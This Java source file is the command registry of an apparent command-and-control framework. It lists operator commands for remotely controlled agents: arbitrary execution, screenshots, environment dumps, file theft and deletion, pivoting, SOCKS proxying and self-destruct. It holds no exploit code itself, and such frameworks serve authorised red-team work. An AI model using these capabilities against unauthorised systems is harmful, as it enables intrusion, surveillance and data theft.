package com.raven.core.command;

import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

public final class CommandRegistry {

    public enum Category {
        SYSTEM,
        SERVER,
        SESSION,
        RECON,
        FILESYSTEM,
        TASK,
        LATERAL,
        OPERATOR,
        CHAT,
        EXPORT,
        WEB
    }

    public record CommandDef(String Name, String Usage, String Description, Category Cat, boolean RequireTeamMode) {}

    private static final Map<String, CommandDef> REGISTRY = new LinkedHashMap<>();

    static {
        // SYSTEM
        reg("help", "help", "Show this command reference", Category.SYSTEM, false);
        reg("clear", "clear", "Clear the terminal screen", Category.SYSTEM, false);
        reg("exit", "exit", "Shutdown and exit", Category.SYSTEM, false);
        reg("quit", "quit", "Alias for exit", Category.SYSTEM, false);

        // SERVER
        reg("status", "status", "Show server and database status", Category.SERVER, false);
        reg("logs", "logs", "Show recent server event logs", Category.SERVER, false);

        // SESSION
        reg("sessions", "sessions", "List all active agent sessions", Category.SESSION, false);
        reg("agents", "agents", "Alias for sessions", Category.SESSION, false);
        reg("stats", "stats", "Show session statistics", Category.SESSION, false);
        reg("use", "use <id>", "Enter interactive shell with agent", Category.SESSION, false);
        reg("sysinfo", "sysinfo <id>", "Show full system info for agent", Category.SESSION, false);
        reg("info", "info <id>", "Alias for sysinfo", Category.SESSION, false);
        reg("exec", "exec <id> <command>", "Execute arbitrary command on agent", Category.SESSION, false);
        reg("shell", "shell <id> <command>", "Execute via shell interpreter (sh/cmd)", Category.SESSION, false);
        reg("broadcast", "broadcast <id,id,...|all> <command>", "Broadcast command to selected agents", Category.SESSION, false);
        reg("kill", "kill <id>", "Terminate an agent session", Category.SESSION, false);
        reg("ping", "ping <id>", "Ping agent to check liveness", Category.SESSION, false);
        reg("reconnect", "reconnect <id>", "Force agent to reconnect", Category.SESSION, false);
        reg("self-destruct", "self-destruct <id>", "Wipe and terminate agent (ADMIN+)", Category.SESSION, false);
        reg("sleep", "sleep <id> <seconds>", "Set agent check-in interval", Category.SESSION, false);

        // RECON
        reg("whoami", "whoami <id>", "Run whoami on agent", Category.RECON, false);
        reg("ps", "ps <id>", "List running processes on agent", Category.RECON, false);
        reg("env", "env <id>", "Dump environment variables on agent", Category.RECON, false);
        reg("ifconfig", "ifconfig <id>", "Show network interfaces on agent", Category.RECON, false);
        reg("ipconfig", "ipconfig <id>", "Alias for ifconfig (Windows)", Category.RECON, false);
        reg("netstat", "netstat <id>", "Show network connections on agent", Category.RECON, false);
        reg("screenshot", "screenshot <id>", "Capture screenshot from agent desktop", Category.RECON, false);

        // FILESYSTEM
        reg("ls", "ls <id> [path]", "List directory contents on agent", Category.FILESYSTEM, false);
        reg("pwd", "pwd <id>", "Print working directory on agent", Category.FILESYSTEM, false);
        reg("cat", "cat <id> <file>", "Read file contents from agent", Category.FILESYSTEM, false);
        reg("rm", "rm <id> <path>", "Delete file or directory on agent", Category.FILESYSTEM, false);
        reg("mkdir", "mkdir <id> <path>", "Create directory on agent", Category.FILESYSTEM, false);
        reg("download", "download <id> <remote-path>", "Download file from agent to operator", Category.FILESYSTEM, false);
        reg("upload", "upload <id> <local-path> [remote-path]", "Upload file from operator to agent", Category.FILESYSTEM, false);

        // TASK
        reg("tasks", "tasks", "Show pending task queue", Category.TASK, false);
        reg("history", "history [id] [limit]", "Show command history (all or per agent)", Category.TASK, false);
        reg("sesshistory", "sesshistory [limit]", "Show session connection history", Category.TASK, false);
        reg("sessions-history", "sessions-history [limit]", "Alias for sesshistory", Category.TASK, false);
        reg("note", "note <id> <text>", "Set a note for an agent", Category.TASK, false);
        reg("getnote", "getnote <id>", "Get the note for an agent", Category.TASK, false);
        reg("pivot", "pivot <id> <host:port>", "Register a pivot route through agent", Category.TASK, false);

        // LATERAL
        reg("portfwd", "portfwd <id> <lport> <rhost> <rport>", "Forward local port through agent", Category.LATERAL, false);
        reg("socks", "socks <id> <lport>", "Start SOCKS5 proxy through agent", Category.LATERAL, false);

        // OPERATOR
        reg("listopt", "listopt", "List all operators and their roles", Category.OPERATOR, false);
        reg("listoperators", "listoperators", "Alias for listopt", Category.OPERATOR, false);
        reg("addopt", "addopt <user> <pass> [SUPER|ADMIN|OPERATOR|MEMBER]", "Add a new operator account", Category.OPERATOR, false);
        reg("addoperator", "addoperator <user> <pass> [role]", "Alias for addopt", Category.OPERATOR, false);
        reg("delopt", "delopt <username>", "Delete an operator account", Category.OPERATOR, false);
        reg("deleteoperator", "deleteoperator <username>", "Alias for delopt", Category.OPERATOR, false);
        reg("kick", "kick <username>", "Kick and remove operator (SUPER only)", Category.OPERATOR, false);
        reg("kickopt", "kickopt <username>", "Alias for kick", Category.OPERATOR, false);
        reg("setrole", "setrole <user> <SUPER|ADMIN|OPERATOR|MEMBER>", "Change operator role", Category.OPERATOR, false);
        reg("changerole", "changerole <user> <role>", "Alias for setrole", Category.OPERATOR, false);
        reg("passwd", "passwd <user> <newpass>", "Change operator password", Category.OPERATOR, false);
        reg("changepassword", "changepassword <user> <newpass>", "Alias for passwd", Category.OPERATOR, false);

        // CHAT
        reg("chat", "chat", "Show in-memory chat messages", Category.CHAT, false);
        reg("chathistory", "chathistory [limit]", "Show chat history from database", Category.CHAT, false);
        reg("chatlog", "chatlog [limit]", "Alias for chathistory", Category.CHAT, false);
        reg("ch", "ch <recipient> <message>", "Send direct message to operator", Category.CHAT, true);
        reg("gc", "gc <all|name1,name2,...> <message>", "Send group or broadcast chat message", Category.CHAT, true);

        // EXPORT
        reg("export", "export <target> <format>", "Export data to file  |  targets: all, logs, chat, history, sessions, operators, notes  |  formats: txt, json", Category.EXPORT, false);

        // WEB
        reg("webstart", "webstart [host] [port]", "Start the web panel server", Category.WEB, false);
        reg("webstop", "webstop", "Stop the web panel server", Category.WEB, false);
        reg("webstatus", "webstatus", "Show web panel status", Category.WEB, false);
    }

    private static void reg(String Name, String Usage, String Desc, Category Cat, boolean TeamOnly) {
        REGISTRY.put(Name, new CommandDef(Name, Usage, Desc, Cat, TeamOnly));
    }

    public static CommandDef Get(String Name) {
        return REGISTRY.get(Name.toLowerCase());
    }

    public static boolean Has(String Name) {
        return REGISTRY.containsKey(Name.toLowerCase());
    }

    public static Map<String, CommandDef> All() {
        return Collections.unmodifiableMap(REGISTRY);
    }

    public static List<CommandDef> ByCategory(Category Cat) {
        return REGISTRY.values()
            .stream()
            .filter(C -> C.Cat() == Cat)
            .collect(Collectors.toList());
    }
}
